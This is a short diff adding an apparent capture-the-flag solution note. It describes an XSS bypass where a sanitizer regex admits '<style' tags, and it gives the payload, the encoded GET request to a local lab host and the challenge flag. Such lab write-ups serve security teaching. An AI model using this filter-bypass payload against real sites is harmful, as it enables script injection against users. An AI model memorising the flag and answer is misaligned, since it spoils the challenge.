@@ -1,0 +1,4 @@
+# XSS bypass via <style onload=alert('XSS')>. Sanitizer regex allows any tag starting with '<style', preserving event handlers. onload fires on style elements when stylesheet is processed. Returns flag{fcec3afc-4b74-433f-b638-14091e51092e}.
+
+GET /page?name=%3Cstyle+onload%3Dalert%28%27XSS%27%29%3E HTTP/1.1
+Host: 172.17.0.1:38891
